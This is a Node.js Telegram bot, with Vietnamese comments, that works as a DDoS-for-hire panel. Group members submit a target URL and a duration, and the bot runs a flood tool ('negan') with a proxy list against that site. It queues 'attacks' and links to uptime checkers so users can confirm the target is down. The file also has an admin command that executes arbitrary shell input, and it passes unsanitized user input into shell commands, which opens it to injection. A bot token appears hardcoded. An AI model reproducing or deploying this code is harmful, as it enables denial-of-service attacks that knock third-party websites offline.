const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(), attackQueue = [];

// Thông báo bot đã sẵn sàng
let isBotReady = true;
bot.sendMessage(adminId, '[Version PRO] 🤖 Bot đã sẵn sàng nhận lệnh.');
console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');

// Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

// Hàm gửi thông báo dưới dạng HTML
const sendHtmlMessage = async (chatId, message) => {
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

// Hàm thực thi lệnh
const executeCommand = async (chatId, command, host, time, username) => {
    const pid = Math.floor(Math.random() * 10000), startTime = getVietnamTime();
    const startMessage = `<b>🚀 Thành công 🚀</b>\n<pre>PID: ${pid}\nWEBSITE: ${host}\nThời gian: ${time} Giây\nNgười gọi lệnh: @${username}\nThời gian bắt đầu: ${startTime}\nSố lượt tấn công có thể gọi đồng thời: ${maxSlot} slots\n[Kiểm tra Host](https://check-host.net/check-http?host=${host}) | [Host Tracker](https://www.host-tracker.com/en/ic/check-http?url=${host})</pre>`;
    await sendHtmlMessage(chatId, startMessage);

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        const endTime = getVietnamTime();
        const completeMessage = `<b>✅ Tiến trình hoàn tất</b>\n<pre>PID: ${pid}\nWEBSITE: ${host}\nThời gian: ${time} Giây\nNgười gọi lệnh: @${username}\nThời gian kết thúc: ${endTime}</pre>`;
        sendHtmlMessage(chatId, completeMessage);
        currentAttacks.delete(chatId);
        if (attackQueue.length > 0) {
            const nextAttack = attackQueue.shift();
            executeCommand(nextAttack.chatId, nextAttack.command, nextAttack.host, nextAttack.time, nextAttack.username);
        }
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return sendHtmlMessage(chatId, '<b>🚫 Bạn không có quyền thực hiện lệnh này.</b>');

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http://') || text.startsWith('https://')) {
        const parts = text.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return sendHtmlMessage(chatId, '<b>🚫 Sai định dạng! Nhập theo: &lt;URL&gt; &lt;time&gt;.</b>');
        const [host, time] = parts;
        if (time > maxTimeAttacks) return sendHtmlMessage(chatId, `<b>🚫 Thời gian tối đa là ${maxTimeAttacks} giây.</b>`);

        // Kiểm tra số lệnh đang chạy của người dùng
        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
        if (userAttacks >= maxSlot) {
            const remainingTime = maxTimeAttacks - (Date.now() - currentAttacks.get(chatId).startTime) / 1000;
            return sendHtmlMessage(chatId, `<b>🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.</b>`);
        }

        // Kiểm tra số lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return sendHtmlMessage(chatId, '<b>⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...</b>');
        }

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        currentAttacks.set(chatId, { user: chatId, command, startTime: Date.now() });
        executeCommand(chatId, command, host, time, username);
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return sendHtmlMessage(chatId, '<b>🚫 Lệnh không được để trống. Ví dụ: exe ls</b>');
        const child = exec(command, { shell: '/bin/bash' });
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => sendHtmlMessage(chatId, `<b>🚀 Kết quả lệnh:</b>\n<pre>${command}\n${output}</pre>`));
        return;
    }

    // Lệnh không hợp lệ
    sendHtmlMessage(chatId, '<b>🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.</b>');
});
